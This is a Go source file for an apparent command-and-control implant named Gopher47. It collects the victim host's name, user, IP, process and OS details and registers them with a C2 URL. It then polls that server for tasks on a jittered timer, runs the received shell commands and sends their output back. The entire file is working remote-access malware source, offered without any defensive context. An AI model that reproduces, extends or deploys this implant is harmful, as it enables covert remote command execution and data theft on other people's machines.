package main

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/user"
	"strconv"
	"strings"
	"time"

	"github.com/An00bRektn/gopher47/pkg/functions"
	"github.com/elastic/go-sysinfo"
)

// Globals
// Only HTTP for now
var url = "http://127.0.0.1:80/"
var sleepTime = 15
var jitterRange = 100
var magicBytes = []byte("\xc0\xff\xee\xee")
var agentId = genHeader(4)

func checkError(e error){
	if e != nil {
		panic(e)
	}
}

func genHeader(length int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyz")
    header := make([]rune, length)
    for i := range header {
        header[i] = letters[rand.Intn(len(letters))]
    }
    return string(header)
}

func registerAgent(url string, magic []byte, agentId string) string{
	host, err := sysinfo.Host()
	hostInfo := host.Info()
	checkError(err)
	proc, _ := sysinfo.Self()
	procInfo, _ := proc.Info()

	hostname := hostInfo.Hostname
	currentuser, _ := user.Current()
	procPath, _ := os.Executable()

	registerDict := map[string]string{
		"AgentID": agentId,
		"Hostname": hostname,
		"Username": currentuser.Username,
		"Domain": "",
		"InternalIP": strings.Split(hostInfo.IPs[2], "/")[0],
		"Process Path": procPath,
		"Process ID": strconv.Itoa(procInfo.PID),
		"Process Parent ID": strconv.Itoa(procInfo.PPID),
		"Process Arch": "x64",
		"Process Elevated": "0",
		"OS Build": hostInfo.OS.Build,
		"OS Arch": hostInfo.Architecture,
		"Sleep": "1",
		"Process Name": procInfo.Name,
		"OS Version": hostInfo.OS.Name + " " + hostInfo.OS.Version,
	}

	dat, _ := json.Marshal(registerDict)
	requestDat := `{"task":"register","data":` + string(dat) + "}"

	// https://stackoverflow.com/questions/16888357/convert-an-integer-to-a-byte-array
	size := len(requestDat)+12
	sizeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(sizeBytes, uint32(size))

	// https://stackoverflow.com/questions/8461462/how-can-i-use-go-append-with-two-byte-slices-or-arrays
	// agentHeader = sizeBytes + magicBytes + agentId
	agentHeader := append(sizeBytes, magic...)
	agentHeader = append(agentHeader, []byte(agentId)...)

	// TODO: Try some amount of times then just exit
	// https://stackoverflow.com/questions/24455147/how-do-i-send-a-json-string-in-a-post-request-in-go
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(append(agentHeader, []byte(requestDat)...)))
	checkError(err)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Content-Length", strconv.Itoa(size))

	client := &http.Client{}
    res, err := client.Do(req)
	if (err != nil){
		return "failed"
	}
    defer res.Body.Close()

	resBody, _ := ioutil.ReadAll(res.Body)
	if (string(resBody) == "" || resBody == nil) {
		return "failed"
	}

	return string(resBody)
}

func checkIn(dat string, checkInType string) string{
	requestDat := `{"task":"`+checkInType+`","data":"` + string(dat) + `"}`

	// https://stackoverflow.com/questions/16888357/convert-an-integer-to-a-byte-array
	size := len(requestDat)+12
	sizeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(sizeBytes, uint32(size))

	// https://stackoverflow.com/questions/8461462/how-can-i-use-go-append-with-two-byte-slices-or-arrays
	// agentHeader = sizeBytes + magicBytes + agentId
	agentHeader := append(sizeBytes, magicBytes...)
	agentHeader = append(agentHeader, []byte(agentId)...)

	// https://stackoverflow.com/questions/24455147/how-do-i-send-a-json-string-in-a-post-request-in-go
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(append(agentHeader, []byte(requestDat)...)))
	checkError(err)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Content-Length", strconv.Itoa(size))

	client := &http.Client{}
    res, err := client.Do(req)
    checkError(err)
    defer res.Body.Close()

	resBody, _ := ioutil.ReadAll(res.Body)
	return string(resBody)
}

func RunCommand(command string) string {
	output := ""
	switch (strings.Split(command, " ")[0]){
	case "shell":
		output = functions.Shell(string(command[5:]))
	case "o7":
		os.Exit(2)
	}
	return output
}

func main(){
	rand.Seed(time.Now().UnixNano())

	// Attempt to register
	registered := "failed"
	for registered == "failed"{
		registered = registerAgent(url, magicBytes, agentId)
		time.Sleep((time.Duration(5) * time.Second))
	}
	fmt.Println("[+] Gopher47 has checked in!")

	command := ""
	task := ""
	out := ""
	r := 1
	// Begin execution
	for {
		command = checkIn("", "gettask")
		//fmt.Println("[*] New Task: " + command)
		if (len(command) > 4) {
			task = strings.Split(command, string(command[0:4]))[1]
			out = RunCommand(task)
			checkIn(out, "commandoutput")
		}
		r = rand.Intn(jitterRange)
		time.Sleep((time.Duration(sleepTime) * time.Second) + (time.Duration(r) * time.Microsecond))
	}
}